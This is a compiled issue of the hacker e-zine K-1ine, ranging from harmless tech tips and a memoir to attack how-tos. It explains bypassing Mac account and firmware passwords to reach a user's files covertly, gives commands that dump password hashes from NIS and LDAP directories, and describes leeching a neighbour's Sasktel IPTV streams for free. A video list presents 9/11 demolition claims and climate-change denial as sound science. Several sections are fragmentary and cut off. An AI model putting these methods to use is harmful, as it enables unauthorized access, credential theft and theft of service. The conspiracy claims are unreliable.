   Ahoy!

   So here we are; 8 years and an unbelievable 50 issues later! Many people,
   including myself, cannot believe we made it this far, wrote so many facin-
   ating articles, (along with Hack Canada) revolutionized the Canadian scene
   and put K-1ine on the map as one of the most well respected e-zine's around.

   Throughout this Northern revolution, we managed to learn more about techno-
   logy than we ever thought was possible, pissed off authority to no end, and
   most importantly inspired a new generation of hackers, phone phreaks, and
   overall technically savvy people.

   None of this could of been possible without the hard work and determination
   of all the writers and supporters such as those individuals who spread the
   word about K-1ine through word of mouth, mirroring of the past and present
   issues, creating K-1ine web-art, etc. Your support has not gone unnoticed,
   even if I never had a real chance to personally thank you for it.

   This issue, with its ass kicking 25 articles goes to show that our scene
   has not slowed down and it most certainly has not died. It continues to
   thrive each and every day because we refuse to submit to the status quo.

   We refuse to accept the media driven bullshit that is spoon fed to the
   masses. We go out there, we make our machines and our telephones do what
   they were never meant to do. We push the boundaries, the limits and we
   never stop. We won't be stopped. Government can't stop us, corporations
   can't stop us, our parents can't stop us.

   Let this issue be a constant reminder of what can be done when brilliant
   people work together on a similar cause.

   Margaret Mead said it best. Better than I ever could. So I leave you with
   this quote which I believe sums it up perfectly...

   "Never doubt that a small group of thoughtful, committed people can change
   the world. Indeed, it is the only thing that ever has."

    Link of the Wheneverly:

    Every whenever I post one really great "link of the wheneverly" on each

    industry, music scene, rave scene, punk scene, or even a good article
    you read on a news site.

    For the Summer 2007 issue of K-1ine, the link of the whenever-we-feel-
    like-releasing-this-motherfucking-issue is:

Removing Useless Code from Universal Binaries
By Tek


> Disclaimer

Please make backups prior to doing anything found in this article.  I take no
responsibility for any problems that may occur.


> What are Universal Binaries?

The Universal Binary, as called by Apple, is an application bundle (.app)
designed to run on both Intel and PowerPC-based Apple computers running OS X.

The introduction of the UB in 2005 meant that software developers could
maintain a single binary capable of running on both platforms instead a
separate one for both Intel and PPC.

Another advantage is that one would not have to rely upon emulation via
Rosetta, which can often be sluggish.


> The problem

While the Universal Binary is useful to developers, it causes a couple of
issues for users.

The first issue being that quite often universal binaries are larger that one
for a single platform.

Another issue is that time can be wasted while your machine selects the correct
code to execute.

But fear not, I have a simple solution.


> The solution

A quick search of Google will reveal a number of solutions for removing foreign
code from a UB, however they are all merely wrappers for tools already at your
disposal, and in many cases are sketchy at best.

My solution is both free and relatively safe.

First step, open up a terminal emulator. 

Now, we are going to cd to '/Applications/0xED.app/Contents/MacOS/', which is
where the 0xED binary lays.

We don't want to waste our time stripping out the code if we don't need to, so
we will first check to see if this universal or not:

iMac:/Applications/0xED.app/Contents/MacOS jim$ lipo 0xED -info
Architectures in the fat file: 0xED are: ppc i386

Since it is, we will remove the PPC code, as it is unecessary on my Intel-based 
machine.

At this point we actually have a couple of options fore removing the code; the 
first is to remove a given architecture and the second is to remove all 
architectures except the one needed.

Method 1 (-remove):

lipo 0xED -remove ppc -output 0xED

lipo <input file> -remove <architecture to remove> -output <output file>

And with that, we have removed all PPC code, stripped down the bundle size from
1.1MB to 773KB, and have possibly sped up its execution somewhat.

Method 2 (-thin):

lipo 0xED -thin i386 -output 0xED

lipo <input file> -thin <architecture to remain> -output <output file>

And with our second method we have created a thinned binary, containing only the
specified architecture, removing all other types.  This method is only handy if
there are more than two platforms present. 

Keep on hacking.

Apple Macintosh security

highjacked
December 31st 2006

------------------------

I will cover five (5) areas of security, listed in degree of probability and
implementation.

1) User account passwords
2) Physical security
3) Data encryption (File Vault)
4) Open Firmware/Extensible Firmware Interface/boot passwords
5) ATA disk passwords


User account passwords
----------------------

I see more often than not, users actually "securing" their account with an account
password. Even in a traditional single user environment, more often than not an
account password is enabled. For most typical Apple Macintosh users, this level
of security is good enough.

These user account passwords are very easy to circumvent, one of the easiest met-
hods I have come across for disabling these passwords and gaining access to a
user account is to boot the machine using an OS installation disk. Once the OS
installation disc has been booted, Apple has provided a utility called Reset
Password.

With the Reset Password utility launched, you have the ability to modify or remove
any current password from any account on the system (including the root user).
When you have done so, it is just a matter of booting the machine again and sele-
cting the user account who's password was modified or removed.

Although this is a very quick and easy method for gaining access to the account,
it is not a very unobtrusive method for doing so. If your intentions are to br-
owse, modify or copy data to or from a selected account without the knowledge of
the legitimate end user you will need to use an alternative method for doing so.

Far easier than the above mentioned method of gaining access to a users files is
booting into single user mode (hold the Apple + S keys while booting), doing so
will allow you to browse, modify or copy to or from the selected account, while
your doing so will remain completely unknown to a targeted end user. Using this
method you will also be able to determine if any of the systems user accounts
are encrypted using File Vault, accounts that are encrypted using File Vault
will be displayed as <accountname>.sparceimage

Physical security
-----------------

Almost all Apple Macintosh systems (both portable and desktops) have a slot for
a physical locking/securing device. This is great for temporarily securing the
system to a stationary object or device (although most of these retail devices
are made with very thin braided cable that can be easily cut). It is also phy-
sically possible to rip the locking device out of a target machine, quite easy
to do so with portable machines that are constructed around a brittle inner
magnesium frame.

I see a major fault with these types of securing devices, not only at the phy-
sical level, but the user level as well. Most of the time, the end user of 
such a product will use a very simple combination, I have seen the combination
1-2-3 on numerous occasions.

With the professional line of Macintosh computers (Power Mac G5 and Mac Pro),
Apple has come up with a intuitive solution to restricting the physical acc-
ess to the machines internal components. There is a latch on the back side of
the machine that when lifted will allow the entire side panel of the machine
to be removed, allowing access to the internal components (which are even ea-
sier to remove than the side panel itself). Keep in mind that these machines
are typically used in a professional environment and therefore have the peri-
pherals/components to meet the requirements of a professional end user (up to
16GB of RAM, SATA hard drives in the 300GB+ range, high end video cards).
Having easy physical access to this caliber of components is obscene, Apple's
solution to this possible risk was to provide the option of a lock latch which
flips up from behind the door access lever. You can then secure the entire unit
to a stationary object or, simply secure the enclosure itself (both methods
prohibit access to the internal components).

In the November 2006 issue of Macworld magazine there is a 10 page article co-
vering the Mac Pro, it details every single aspect of the machine from the CPU
and RAM to the graphics card and optical drive. Within this 10 page article,
there is not one mention of security; physical or system. I guess with a $2800
price tag, vanity is king and security is the least of your concerns.

Data Encryption (File Vault)
----------------------------

I will only briefly touch base on data encryption, basically because I do not
use data encryption myself.

Your typical Apple Macintosh user may implement file encryption (to some degree)
on their system for one of two reasons:

1) OS X makes it very easy for the end user to encrypt their data using the File
Vault application which is included with OS X.

2) The end user is inherently security conscious and has taken the time to unde-
rstand, setup and implement data encryption.

I figure the main reason most typical Apple Macintosh users do not use data enc-
ryption on their systems is due to the fact that they just don't understand what
it is, what it does or what it is good for.

File Vault has one other level of security to it that most end users may not be
aware of. If you encrypt your entire user account with File Vault, booting from
an OS installation disc and resetting the user account password will effectively
lock out the selected account. You will not be able to gain access to the user
account information this way, you will need to know the account password to gain
access to an account that has been secured with File Vault.

You can not gain access to any user account that has been encrypted using File
Vault through single user mode (if the entire home folder was encrypted when
setting up encryption through File Vault). If however only selected files or
folders were encrypted when setting up encryption through File Vault, the files
or folders that were not encrypted will still be accessible through single user
mode.

Open Firmware/Extensible Firmware Interface/boot password
---------------------------

Open Firmware is a non-proprietary, platform (CPU and system) independent boot
firmware. Similar to a PC's BIOS, Open Firmware is stored in ROM and is the first
stored program to be executed upon power-up. Open Firmware is used exclusively on
Power PC based Apple Macintosh computers and Extensible Firmware Interface is used
exclusively on Intel based Apple Macintosh computers.

You can enable an Open Firmware password on a target machine that will offer you
varying degrees of system security. The three security modes for the Open Firmware
are:

1) None

This mode effectively disables any form of Open Firmware security.

2) Command

This mode restricts the commands that may be executed to "go" and "boot". Under
the "command" mode the "boot" command may not have any arguments, it will only
boot the device specified in the boot device variable. Any other setting changes
or commands will require a password.

Enabling an Open Firmware password with the "command" variable will prevent users
from using the command key to boot various devices or modes. It will disable the
ability to boot from CD (hold the C key while booting), boot from a network (hold
the N key while booting), FireWire target disk mode (hold the T key while booting),
single user mode (hold Apple + S keys while booting).

3) Full

Enabling an Open Firmware password with the "full" variable will boot the targeted
machine into the Open Firmware and ask for a password when any input is entered
into the machine. None of the alternate boot options will work with this level of
security enabled.

Enabling an Open Firmware password

1. Boot into the Open Firmware (hold the Apple key + Option + O + F while the com-
puter boots).

2. Once in the Open Firmware, use the command "password" to set a new password
(this will need to be entered twice).

3. Once your password has been entered, you need to set the security level with
the following command:

	"setenv security-mode (none/command/full)"

4. Now use the command "reset-all" to have the changes take effect upon the next
boot. You will need to enter your password to execute the "reset-all" command.

Apple went above and beyond the Open Firmware 1275 specification and added a pro-
gressive delay technique to discourage brute force hacking of the Open Firmware
password. The delay itself increases in a pattern of 2^x seconds. This basically
lengthens the time between password entry attempts with each consecutive incorrect
password entry.

The Extensible Firmware Interface for Intel based Apple Macintosh computers has
the same features and functionality of the Power PC based Open Firmware, but can
only be activated/implemented through the use of the Firmware Password Utility
found on the Macintosh OS X (10.1.0 - 10.4.8) installation disc (Applications/Ut-
ilities). The Firmware Password Utility can be used on Power PC based Apple Maci-
ntosh computers to enable the security functions of the Open Firmware, but the
Open Firmware environment will not be present at boot (but a "full" security mode
will be assigned to the computer disabling the ability to boot the computer using
any of the other boot methods).

Open Firmware/Extensible Firmware Interface password circumvention

The Open Firmware/Extensible Firmware Interface password is easily circumvented!
To remove an Open Firmware/Extensible Firmware Interface password you must change
the amount of physical RAM the machine "sees". This can be done by adding or rem-
oving a RAM module to or from the system. This task is easily performed on most
portable systems, due to the fact that the RAM slot(s) are easily accessible und-
erneath the keyboard (which lift up with the recession of two clips).

After you have changed the amount of physical RAM in the target machine, it is
mandatory that you reset the PRAM. This is done by holding the Apple + Option +
P + R keys wile booting the machine, you will have to do this three consecutive
times for the Open Firmware/Extensible Firmware Interface password to be reset.

ATA hard drive security
-----------------------

Most modern ATA and SATA hard drives support the ATA Security Mode Feature Set
which includes the function to protect the contents of the drive from unautho-
rized access by the use of two passwords, a user password and a master password.

A supported hard drive can be locked in two modes, high security mode or maximum
security mode.

In high security mode you can unlock the hard drive with either the user or mas-
ter password, the password entry attempts are typically limited to 5 attempts
before you must re-start the machine and attempt password entry again.

In maximum security mode you can not unlock the drive without the correct user
password. Utilities such as atapwd have proven useless (from my personal experi-
ences) and only lead to frustration when attempting to recover or gain access to
data on a hard drive with the security/password function enabled.

Data recovery is not possible by swapping the PCB from another hard drive to the
effected drive, the ATA password is stored in the firmware zone on the hard dri-
ves platters.

One method I know works for the recovery of this password is remote unlocking, a
service provided by various companies on the internet. This method involves using
specific software and algorithms to remove the password on the targeted device.
Below is a portion of the recovery log from such a process.

I am unaware at the time of this writing if it is at all possible to secure a
Apple Macintosh computer with an ATA password, as there is no traditional BIOS
setting or option that would make this task easy to perform.


Conclusion
----------

Computers and the information they store will never be secure, where there is
a will there is a way.

Hacking the Patent Database
by aestetix

If anyone has kept up with the Microsoft/Open Source battle over the 
last month or so, they would have noticed a suspicious headline:

"Linux infringes on Microsoft Patents, said Ballmer."

There were at least a dozen news articles about this. Nobody could 
figure out what the hell he was talking about. Linux programmers tend 
to be in their own world, ignoring Microsoft, or letting the cathedral 
and the bazaar coexist. It's hard to prompt conflict if you're ignoring 
your adversary.

My first inclination was that Ballmer is on crack. Most blog writeups 
about this had similar conclusions. "What the hell is he talking about?" 
Some people thought he was referring to the deal with Novell... which 
makes some sense, but not enough to justify that headline. So one night, 
I decided to snoop around.

The United States Patent and Trademark Office (USPTO) keeps an online 
database of current patents at uspto.gov. There's an interface that 
lets you enter parameters and search by attributes such as "Date of 
Issue", "Assignee" (company who filed the patent), "Inventor", and so 
on. I performed a search where the Assignee Name was "Microsoft", and 
pulled just over 5000 patent results.

Looking through them, I started to get suspicious. Some patent titles 
are very vague, some describe extremely simple computing tricks that 
shouldn't be patented (for example, a method of changing an icon when 
the cursor passes over it). It also seemed like there were a number of 
generic titles under which multiple patents were filed, as well as very 
similar, almost isotopic patents, filed with slightly different 
wordings. Possibly to get around legal loopholes?

I decided this needed more attention than a quick browsing could give 
it, so I wrote up a simple shell script which did a simple wget 
loop on the USPTO search url and downloaded all the patents the search 
returned.

By now, I had a directory on my system with over 5000 html files. That's 
a lot of data, and there's very little I can do with it unless it's 
parsed properly. So I wrote a perl script that went through all the 
files and parsed them into XML.

Anyone who's worked with databases at all can see where I'm going from 
here. Import all the XML into a database. and suddenly you can do 
whatever your query's limit. All kinds of strange bits popped up. I 
started learning a lot about the USPTO's internal workings. For example, 
patents can be filed on any day, but all the MS patents were issued on 
Tuesday. Also, most "Assignee" names were "Microsoft Corporation", but 
some were "Microsoft Corp.", or even "Microsoft, Inc.". I haven't 
figured out why yet. It could be simple naming conventions, it could 
represent the department at MS from which the patents originated, or it 
might meet some USPTO quota. Also, and most interesting, there are a 
number of patents filed under a different Assignee name, with Microsoft 
as an afterthought in parentheses.

There are many more conclusions which could be drawn from this, some
that are very sinister, but for the sake of bias I'll withhold my 
judgements from this article.

Finally, I decided that while my research could be useful, it does no 
good unless I have a way to keep up with new patents that are issued. Do 
you want to be the company that spends 5 years working to release a 
cutting edge product, only to discover in a lawsuit that Microsoft filed 
for a patent on your technology (ironically around the same time you 
began the website)? So what's the one way that everyone can keep track 
of instant updates? RSS :)

I've attached the code I wrote to suit my tasks. Feel free to change it 
however you like, provided it remains free and open source. I will 
continue making updates to this code to turn it into a more functional
RSS feed. When it is available, I will make an announcement on 
www.aestetix.net.

Enjoy "Keeping an eye on Great Satan one patent at a time" :)

LDAP And NIS For Fun And Profit

There are a few commands executed in this article and they assume you are on
some form of *nix. LDAP stands for Lightweight Directory Access Protocol, and
NIS stands for Network Information Service. They are both used as rather com-
mon methods for authentication and authorization. When configured improperly
or more over lazily they can be rather insecure. Authentication is the act of
proving who you say you are. While, authorization is used for determining what
you have access to. For example, to prove my identity as sally I provide my
secret password that only I know. Once it has been confirmed as being my pass-
word I have now been authenticated as the user Sally. Now that I am authentic-
ated as Sally I can now be given my access permissions, or I have been author-
ized to perform certain functions and open certain files.

NIS was developed by Sun Microsystems for the purpose of centralizing network
information host files, user information, etc. Thanks to NIS, a sysadmin no
longer had to maintain multiple configuration files for all the machines with-
in his domain. Rather he could maintain one set of central files and have them
distributed across the network. However, NIS is quick and dirty, as a result,
very insecure. There have been adaptations to NIS in an attempt at improving
security called NIS+ and NYS. These are outside the scope of this document.
However, some of the information here may apply.

An LDAP server is used mainly as a central repository for storing information.
Within an LDAP directory one can store user information, phone numbers, host
information, or a vast amount of other information. NIS is blatantly insecure
as a matter of fact if you want security with NIS you might as well just use
LDAP instead. Some of the problems with NIS are, no traffic encryption, and
free access of information to almost anyone who wants it. 

When a client machine communicates with the NIS server the traffic between the
two is sent in the clear text. So when a user wants to authenticate his or her
password with the NIS server the password hash is sent right over the wire.
This makes NIS vulnerable to Man in the Middle Attacks. While the password is
sent in it's hashed form, meaning that the password is encrypted it can usually
be easily broken using a tool such as John the Ripper. At one time this simple
encryption was good enough but with the increase in computing performance came
the increase in password cracking performance. So if you use a password like
Xkr39fg927xzyracerqbert%$@monkey you are probably safe. If however you are
like most users and use a password like god, sex, cat, billy, or marijuanaman-
13, you are screwed. NIS has some tools that is uses to give out information.
One of them being ypcat. So the next time you are on a NIS enabled network,
try the following. $ypcat passwd. Oh what's that? Oh right that's the passwd
file with all the user password hashes. Own3d. For more information on how to
use ypcat see the ypcat man page.

An LDAP server can be a much more secure than using NIS. Out of the box most
LDAP servers support using encrypted traffic and access control to the direc-
tory. Meaning that if it has been configured properly, it is not vulnerable to
Man in the Middle Attacks and does not give out information freely.

If LDAP has not been configured to encrypt it's authentications, then much
like NIS the passwords can be sniffed out with a Man in the Middle Attack. 

Also, if access control has not been enabled on the directory one can search
the directory much like one could search a phone book. These searches can be
performed with the tool ldapsearch. ldapsearch is a complex  tool. It's entire
being is too complex for the scope of this article, as a result it will not be
covered in it's entirety. To do a basic search of the ldap directory perform
the following:

$ldapsearch -x -H ldap://IPADDYorHOSTNAME 

Replace IPADDYorHOSTNAME with the IP address or hostname for the LDAP server.
This command will dump the entire contents of the LDAP directory. Depending
on the size of the installation using LDAP this directory can be huge! As a
result one may wish to fine tune their search by using the -b or the base
switch. However this will require knowing all the domain components of the
LDAP server. The DC's are usually compromised by the domain name of the
organization. For example the DC's or domain components for www.phrack.org
would most likely be, phrack and org. The base switch then being "dc=phrack,
dc=org".  So our command now becomes:

$ldapsearch -x -H ldap://IPADDYorHOSTNAME -b '"dc=domain,dc=suffix"

Once again this will spill the entire directory out at us so we should do
some more fine tuning. LDAP directory's are commonly broken up into groups 
called organizational units. Common groups include People (user information),
Hosts (Host information), and Networks (information about other networks).
In order search within a group we must prepend the base switch (-b option to
ldapsearch) with "ou=group" Replacing group with the intended organizational
unit. To get only the information contained within a group we execute:

$ldapsearch -x -H ldap://IPADDYorHOSTNAME -b "ou=group,dc=domain,dc=suffix"

If you chose to search out the "People" group, congratulations you just got
the password hashes. There is one more tactic we can employ similar to using
ypcat as previously mentioned. If we are on a host using the nss_ldap module
for authentication, from a terminal execute:

$getent passwd

If the LDAP administrator did not enable shadowed passwords this will dump
the hashed user paswords in the format of a typical /etc/passwd file. If
however shadowed passwords is enabled the password hash will be replaced with
an x. While this article does not encompass NIS or LDAP in their entireties,
it does hopefully give insight into some of their most common means of explo-
itation. For all the would be LDAP and NIS administrators, or curious hackers

The Year Was 1978

The year was 1978, led watches were all the rage. Bat Out of Hell was gaining
popularity and a massive following, as two boys wandered through the Newmarket
Mall when suddenly their eyes are drawn to a desk in the Radio Shack store.
Sitting upon this small worn desk was a Tandy TRS-80 computer drawn by some
unseen force we were dragged before this new altar to <insert your divine
being here>. 

Many an afternoon was spent, me and Butterballs aka Froggy (for his love of
turkey, not some sexual fetish) in front of that computer, learning the ins
and outs.. pokes and peeks of BASIC. 

But alas all good things come to an end, and eventually the management took
away the endless public access to this wonderful device, perhaps to encourage
the nagging of parents to purchase this to ease their ringing ears. 

The fever was further fueled by a visit to a large insurance company in down-
town Toronto where my mother worked, it was a bring your brat in day and I
starred in wonder at the banks of Univac computers.. their tape drives spinn-
ing, a large disc platter/cartridge being inserted into its housing, the hum
of electronics like a chorus. 

It was not to be, and time passed by... 1981 rolled in, Butterballs family
gave into the nagging first and he was the proud owner of a VIC 20. Shortly
after, I too got lucky at Christmas time and Satan Claws brought me my very
own VIC. 

Countless hours were spent, Jim Butterfield became our digital Prophet and
Compute Magazine was the written word. The time spent, turned out well for 
when we entered Sutton District High, we took grade 11 and 12 comp classes
in grade 8 and 9 and the rest of the schooling was pretty much a bore after 
that.. except Chem class.. how we liked fire and things that went boom (but
that is many other stories). 

The benefit of having pre experience in Commie Basic, the high school comp
studies were all Commodore Pets, 4032 and 8032's, and the class consisted of 
programming in BASIC, at the end we got to learn a bit of FORTRAN and do our
own hello world program, punched into cards to be read by the card reader on
the mainframe in Markham. 

Do you want to play a game? 

The movie War Games came out in 1983, and that was a major inspiration to
explorers of the new frontier. Shortly after we both upgraded to Commodore 
64.s and much tinkering was to be had. This is also the time we started
experimenting with electronics, first with a Radio Shack 100 in 1 kit, and
how to hook stuff up to the expansion ports on the VIC.s and 64's. (Timer
circuits were also found to be of use for those other stories).

The teen years were drawing closer to their end, High School was over and we
entered the work world. By this time Butterballs had moved to Markham, his 
father having passed away in Keswick a while back.  

Money was made, but our involvement with the computers slowed down and moved
into other things, like firearms, Black Badge pistol shooting, and well fire
and things that go boom stuff. 

One day I awoke and heard a voice, GO WEST YOUNG MAN. and I did so, to Alberta
I drove, three and a half days and I found myself at my uncles place, who to
my surprise had just purchased a new type of computer I had never touched. An
Intel 286, with a modem, running DOS. A new intense addiction started and all
the hours that I could spend on it I did, for after gaining a understanding
of how the system worked, and how to get the terminal program going. I found
the BBS scene. 

Williams BBS, was the first and for the longest time the main BBS I called in
the Edmonton area. It ran Maximus by Scott Dudley, and I began to find the
love of Fidonet Mail and a good file base. 

The rest of the family moved out from Ontario, and I had saved enough to get
myself a 386 and a phone line. After much downloading over days due to time
limits on the various BBS accounts, I was busy installing my own copy of
Maximus, and FrontDoor and the various door games of the time, Solar Realms
Elite etc. The board opened as a RPG (Advanced Dungeons and Dragons, War-
hammer) hangout.  

Over time, I explored other BBS packages that I found as I dialed about North
America, till one day I came across the Vine BBS, in Cicero Illinois, run by
a fellow named Michael Paris.. (who after some research seems to have gotten
himself in much trouble). 

At this time, the Vine BBS was a pro H/P/V with emphasis on the V system. It
was like a new realm of computing had opened to me. Being somewhat foolish I
got a second line for wardialing after finding THC Scan, reliving the heady
days of dreaming after War Games had come out. At least I didn't sequentially
dial an exchange at a time.. sigh.

Eventually I decided to change the name of my BBS, and switch formats. I had
made some connections among several .Private.. 31337 Boards. bah. the type
running Vision/X and Oblivion.. it was fun then but when looking back upon
it.. too too snarly. 

Switched the home BBS software to VBBS, filled the file base up with every
c00l haxor zine  of the time, utilities.. viral code etc, joined NukeNet
for one of the message bases and Miskatonic University was opened. 

Those days in the early to mid 90s were fun to explore, the idea of system
security was not on the top of the agendas of many connected systems. The 
wonders of getting my first U of Eh shell account and this whole internet
thing was dazzling to say the least. 

One day a new user appeared on the board, Cyb0rg/ASM, eventually we met and
things seemed to go click. I was once again lucky to hook up with a talented
and incredibly smart person with whom our shared interests would allow us to
build a friendship. 

Eventually Wizbone and The Clone joined the ranks and the rest is history. 

For those who know me, or suffered through a rant session when I couldn't
feel my fingers on irc. I spent a lot of time as a Genie trapped inside a 
Bottle. Those days are gone, and I am moving forward and hope to see the h/p
scene become as active as it was a few years back.

Rumour has it that Lord Phungus might be opening the Hack Canada bbs up just
for fun. 

Shouts out to the entire HC/Nettwerked Crew and those others who I have met
along the way. Special shouts out to MsO and Cyb for finnaly making me rea-
lize how stupid I had become. 

P.S On a odd note, those who know Alan, my younger years friend Butterballs
went on to do some programming for Major BBS. Years back Alan was a Major 
BBS sysop and had met Butter. small fucking world or what.

TQ out, keep safe.

   |  Thanks to porno, recent advances in video streaming technology    |
   |  allow us to easily share funny, unique, and interesting movies    |
   |  with one another. Over the last several months, I've scoured      |
   |  video sources such as google |videos, youtube, and too many       |
   |  others to name.                                                   |
   |                                                                    |
   |  Here I've compiled a short list of a couple videos I enjoyed.     |
   |  The following videos may be described as thought-provoking,       |
   |  offensive, entertaining, or just plain silly. I'm listing the     |
   |  ones here that I enjoyed, though I don't necessarily endorse all  |
   |  the expressed views.                                              |

   |  With time, some of these links may stop working. Should that ever |
   |  be the case, visit google videos, and search for the video's      |
   |  title. You'll find a fresh copy.                                  |
   |                                                                    |
   |  Consider these videos the first few steps of a long journey       |
   |  toward a better understanding of the world around you.            |
   |                                                                    |

[ Money Masters ]

  Deals with the history of the Federal Reserve Bank in America. Important 
  implications to non-americans as this is essentially how nearly all the  
  banks in the world are run. Chances are, watching this video may reveal  
  that you've been misguided in your understanding of banking, taxes, the  
  issuance of currency, and politics in general.

Pt. 2	http://video.google.ca/videoplay?docid=-7336845760512239683



[ Loose Change ]

  Fairly well-compiled documentary which raises some interesting and valid 
  questions about the disaster on September 11, 2001.

Link	http://video.google.ca/videoplay?docid=7866929448192753501



[ 9/11 Mysteries ]

  This is an excellent film, raising many of the same issues brought up by 
  Loose Change, but deals mostly with details regarding the possibility 
  that the twin towers, and building 7 at the WTC site collapsed due to 
  demolition. Very compelling evidence that the U.S. Government is not 
  sharing the truth behind the events of September 11.

Link	http://video.google.ca/videoplay?docid=-6708190071483512003



[ The Century of Self ]

  Awesome documentary describing how Freud's theories on human nature were 
  used to manipulate and shape society to what it has arrived at today: 
  Trendy, self-interested, desire-driven consumerism. Very fascinating look 
  at the history and growth of North American culture.

Link	http://video.google.ca/videoplay?docid=8953172273825999151



[ The Great Global Warming Swindle ]

  A very good documentary which questions the Greenhouse Gas theory about 
  Global Warming. Very good science in this video. Good explanations as to 
  why the Earth's temperature is rising, why it has nothing to do with CO2 
  emissions, and why we're being misled. If Al Gore's documentary with 
  magic, numberless graphs left a bad taste in your mouth, consider 
  watching this.

  The above ADSL circuit parameters are intended to
  provide some direction in judging readings on the
  downstream side but are not hard and fast limits
  except for Martin and Load Coils.


  Glossary of Terms:


  Margin (SNR)

  Noise margin in dB above the minimum Signal to Noise
  (NSR) required to maintain the data rate (as set by
  the DSLAM)


  FEC/RS

  Forward Error Correction events in each direction,
  sometimes referred to as RS (Reed Solomon) errors.
  These are automatically corrected errors, as such
  they do not require re-transmission of data. Alt-
  hough very high occurrences of FEC errors will
  generally correlate to increasing CRC errors.


  CRC

  Cyclic Redundancy Check errors detected in each
  direction. These numeric checks indicate that
  the ADSL data frame had one or more uncorrected
  errors, so the data must be re-transmitted red-
  ucing the throughput. A high occurrence of these
  errors will result in reduced throughput and in
  the case of video, pixalation is generally exp-
  erienced.


  HEC

  Asynchronous Transfer Mode (ATM) cell Header
  Error Correction events detected in each
  direction.


  Ping Time

  This test involves sending a "PING" packet of
  data to an IP address and measuring the time
  it takes for that site to respond. Very slow
  ping times from a site that is known to res-
  pond quickly may indicate high latency on
  some component in the network.

MAINTENANCE ENGINEERING TRANSPORT/ACCESS

BULLETIN NO: 94-10
DATE: 94-10-14

EQUIPMENT: DIGITAL SUBSCRIBER CARRIER


ATTENTION: All Subscriber Carrier Personnel

SUBJECT: Talkmail Message Waiting Indicator
         Light and Digital Subscxr


PROBLEM:

Subscribers smart phone (eg. Vista 100,200,
Meridian) message waiting light indicators
will not activate when a message has been
left in their TalkMail box, if the subscr-
ibers loop facility is on digital subscri-
ber carrier. (Tadiran Multi-gain excluded).

CAUSE:

First, all TalkMail customers working out
of GTD-5 switches receive only stuttered
dial tone to alert them of message waiting.

Secondly, subscribers working on digital
subscriber carriers out of DMS-100 switches
can receive a ring burst option, (after a
message has been left) to set up a PCM
channel between the CT and RT. This will
be followed by the message waiting indic-
ator data, which will turn on the smart
phones message waiting indicator light.

The problem is when the subscriber retr-
ieves their message and then hangs up.
Upon an on hook, the digital subscriber
carrier releases the PCM channel, bet-
ween the CT and RT. Also upon an on
hook, after retrieving messages, the
VoiceMail system sends data to turn
off the message waiting indicator set
light. This data now has no path to
get to the RT and smart phone to turn
off the message waiting indicator light.

The light just keeps on flashing. There
is no ring burst option in the switch,
at this time, to set up a digital subs-
cribers PCM channel burst between the
CT & RT, which would allow the VoiceMail
data through to turn off the message
waiting indicator light. It is thought
that all the ring brusting that would
be required for the Voicemail message
waiting indications would eventually
tax the ringing plants of the switches,
therefore this method will not be pursued.


SOLUTION:

Even though the customer could manually
turn off the smart phones message waiting
indicators, via the smart phones menu,
after they retrieve their message, it is
our recommendation that a common policy
of only offering stuttered dial tone, for
message waiting indication, to customers
served by digital subscriber carrier.
ADDITIONAL INFORMATION:

Digital subscriber carriers require in-
coming ringing or a subscribers off hook
to set up a PCM channel connection bet-
ween the CT (Central Office Terminal)
and the RT (Remote Terminal).

EQUIPMENT: ALL DIGITAL LOOP CARRIER


ATTENTION: All Subscriber Carrier
           Maintenance Personnel

SUBJECT: Talkmail Message Waiting Indicator
         Light and Digital Subscxr


PROBLEM:

Subscribers smart phone (eg. Vista 100,
200, Meridian) messag waiting indicators
will not activate when a message has been
left in their TalkMail box, or will not
deactivate when retrieving and deleting
messages, if the subscribers loop facility
is on digital subscriber carrier. (Tadiran
Multigain excluded).

CAUSE:

A detailed explanation of the cause of this
problem is in bulletin 94-10, dated 94-10-14.
Briefly, the digital subcxrs only have a PCM
channel available during ringing or off hook
conditions. The necessary data tones to turn
the flashing lights on/off therefore cannot
reach the subscribers phone.

SOLUTION:

There is a new option in the DMS-100 switches
BSC36 or later that initiates a 500 millisec-
ond ring burst after a message has been left
or deleted. The ring burst allows the digital
loop carriers to set up a PCM channel from the
remote to the CO therefore allowing the data
tones through to turn on or off the flashing
message waiting indicator light.

This option functionality is provided by table
control in the MAP of the DMS100 on per line
basis, as part of the MWT line option. A det-
ailed description of how to implement this
feature is explained in NTP 297-1001-801 and
NTP 297-8011-350. Briefly the command string
when using Table IBNFEAT or SERVORD should be
similar to the following:

MWT CMWI Y UDLC N N N

ADDITIONAL INFORMATION:

This bulletin is for DMS-100 switches only.
GTD-5 switches only provider interrupted dial
tone for message waiting indicator.

Sasktel Max (Sasktel's Digital Cable) 

Author: Adio
Date: Feb 28th 2007

Recently I bought a new house which left me without Internet for about 3 weeks.
Sasktel takes forever when you need your internet hooked up! Anyways... the day
I moved in I started a scan for some Wifi access points. Luckily my neighbor
had a open Wifi access point so I jumped all over that. A couple days went by
and I was thinking maybe this guy next door had Sasktel Max too, and I wondered
if I could leech that too. So I had a problem since Sasktel sends all there si-
gnal over IP I had to get the IP's and Ports for nearly 200 channels. How to do
this you may ask? Using my Cisco Catalyst Switch and a friend's existing Sasktel
Max Subscription. I travelled to his house the next day plugged in my Cisco Swi-
tch and started surfing through his channels. After surfing through about 10
channels i checked the logs on my Cisco Switch and there were some IP addresses
I've never seen before with some Ports ranging from 9400 - 9447. So we have some
IP's and some ports now how do we use them. Using the free VLC Media Player and
its option to open a network stream using a UDP Multicast Signal. After putting
in my IP and port that was found by my Cisco Switch I was amazed to see the pi-
cture of the A&E channel load right up! So there we have it a simple way to
leech free cable from those bastards at Sasktel. The only downfall is your neig-
hbors or whoevers Max your leeching, there signal will be scrambled. There would
be away around this if say you and your neighbor had an agreement. They could
simply rent 2 boxes so Sasktel would send to different signals to there house.

After a week you could bring the 2nd rented box back to Sasktel and say you only
need the 1 box and 2 signals will still be sent to your neighbors house! This
only works if your local Sasktel is lazy like mine, and they don't go about re-
programming your line for 1 signal :) Another thing to note is even if your
neighbor is not subscribed to all the channels on this list you can still access
them. When Sasktel comes to your house they program your box to what you have
chosen for packages, but they still send all the signals to your box, but your
box blocks the ones your not subscribed to. Using your computer you have access
to every channel for free. If my neighbor was smart he would just use his computer
and access all the channels for free like me :)

#################################################################################

We all at one point in our hacker career have pursued the infamous connection
uncap, but is it fiction or is it real? Can this be done and without your ISP 
noticing? The straight forward answer is yes and no. Still confused?
 
Let me break it down for you, since the introduction of the Data Over Cable System 
Interface Specification (DOCSIS) systems in the cable industry in modern times. 
It has been possible to uncap connections. 

